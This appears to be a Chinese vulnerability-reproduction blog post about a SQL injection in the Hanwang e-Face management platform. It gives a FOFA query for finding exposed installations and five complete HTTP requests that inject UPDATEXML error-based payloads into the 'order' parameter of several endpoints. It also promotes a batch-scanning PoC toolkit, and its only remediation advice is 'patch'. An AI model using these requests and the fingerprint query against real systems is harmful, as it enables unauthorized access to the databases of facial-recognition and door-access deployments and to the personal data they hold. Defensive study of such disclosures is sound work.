> **原文链接**: https://mp.weixin.qq.com/s?__biz=MzIxMjEzMDkyMA==&mid=2247488693&idx=1&sn=b67691800d32ebf2dc55f5bc0558137e

#  汉王e脸通综合管理平台存在SQL注入漏洞 附POC  
2025-7-16更新  南风漏洞复现文库   2025-07-16 15:55  
  
   
  
免责声明：请勿利用文章内的相关技术从事非法测试，由于传播、利用此文所提供的信息或者工具而造成的任何直接或者间接的后果及损失，均由使用者本人负责，所产生的一切不良后果与文章作者无关。该文章仅供学习用途使用。  
## 1. 汉王e脸通综合管理平台简介  
  
微信公众号搜索：南风漏洞复现文库  
该文章 南风漏洞复现文库 公众号首发  
  
汉王e脸通综合管理平台  
## 2.漏洞描述  
  
汉王e脸通综合管理平台存在SQL注入漏洞  
  
CVE编号:  
  
CNNVD编号:  
  
CNVD编号:  
## 3.影响版本  
  
汉王e脸通综合管理平台  
  
![汉王e脸通综合管理平台存在SQL注入漏洞](https://mmbiz.qpic.cn/sz_mmbiz_png/HsJDm7fvc3YsswxyIViaburjUR3dB2AO6BfAf5BmXdBzbxQeEPBxOzUWmR62WyNt76YOzuVbViazXZgoj8DhajmA/640?wx_fmt=png&from=appmsg "null")  
  
汉王e脸通综合管理平台存在SQL注入漏洞  
## 4.fofa查询语句  
  
icon_hash="1380907357"  
## 5.漏洞复现  
  
漏洞数据包：  

```
GET /manage/authMultiplePeople/queryManyPeopleGroupList.do?recoToken=67mds2pxXQb&page=1&pageSize=10&order=(UPDATEXML(2920,CONCAT(0x7e,md5(123456),0x7e,(SELECT+(ELT(123=123,1)))),8357)) HTTP/1.1Host: xx.xx.xx.xxUser-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)Accept: */*
```


```
GET /manage/authMultiplePeople/getGroupEmployee.do?recoToken=67mds2pxXQb&page=1&pageSize=10&groupId=1&order=(UPDATEXML(2920,CONCAT(0x7e,md5(123456),0x7e,(SELECT+(ELT(123=123,1)))),8357)) HTTP/1.1Host: xx.xx.xx.xxUser-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)Accept: */*
```


```
GET /manage/firstPeopleOpen/getDoors.do?recoToken=67mds2pxXQb&page=1&pageSize=10&order=(UPDATEXML(2920,CONCAT(0x7e,md5(123456),0x7e,(SELECT+(ELT(123=123,1)))),8357)) HTTP/1.1Host: xx.xx.xx.xxUser-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)Accept: */*
```


```
GET /manage/antisubmarine/queryAntisubmarineList.do?recoToken=67mds2pxXQb&page=1&pageSize=10&order=(UPDATEXML(2920,CONCAT(0x7e,md5(123456),0x7e,(SELECT+(ELT(123=123,1)))),8357)) HTTP/1.1Host: xx.xx.xx.xxUser-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)Accept: */*
```


```
GET /manage/authMultiplePeople/getValidEmpForGroup.do?recoToken=67mds2pxXQb&page=1&pageSize=10&order=(UPDATEXML(2920,CONCAT(0x7e,md5(123456),0x7e,(SELECT+(ELT(123=123,1)))),8357)) HTTP/1.1Host: xx.xx.xx.xxUser-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)Accept: */*
```

  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3YsswxyIViaburjUR3dB2AO6JMWRmxcZibOl3Fib4fXHjgLEM1m2s1mhCnGeu3nQtYCibpvH4axYBpK6g/640?wx_fmt=jpeg&from=appmsg "null")  
  
## 6.POC&EXP  
  
本期漏洞及往期漏洞的批量扫描POC及POC工具箱已经上传知识星球：南风网络安全  
1: 更新poc批量扫描软件，承诺，一周更新8-14个插件吧，我会优先写使用量比较大程序漏洞。  
2: 免登录，免费fofa查询。  
3: 更新其他实用网络安全工具项目。  
4: 免费指纹识别，持续更新指纹库。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3YsswxyIViaburjUR3dB2AO61AV3ROuVPXswd9dZ0Ir4IDl6fcTdXfuWRY5GcmdyF2oicEoUJc6omxg/640?wx_fmt=jpeg&from=appmsg "null")  
  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3YsswxyIViaburjUR3dB2AO6JbiayrW9Xmmle1YE10XEmYB1veqELmqJEzsMztLiaNFgIXUE6vXTofCg/640?wx_fmt=jpeg&from=appmsg "null")  
  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3YsswxyIViaburjUR3dB2AO6ea7CTUabmAMKh8lA05tQQRpsAA1vb5xOoiarLkyPiabMzciaWNQWgyNQQ/640?wx_fmt=jpeg&from=appmsg "null")  
  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3YsswxyIViaburjUR3dB2AO61yF2HfkGPwINg6zicNia4aGmd8IsfjBp5cqibkd80omIqTtTGa2icYV4rQ/640?wx_fmt=jpeg&from=appmsg "null")  
  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3YsswxyIViaburjUR3dB2AO6lSMvQEleN4fKurBKTsbGbvibEmKGRdM1VMwfCBFEicT9pYFQXPTkv82A/640?wx_fmt=jpeg&from=appmsg "null")  
  
## 7.整改意见  
  
打补丁  
## 8.往期回顾  
  
  
   
  
  
  
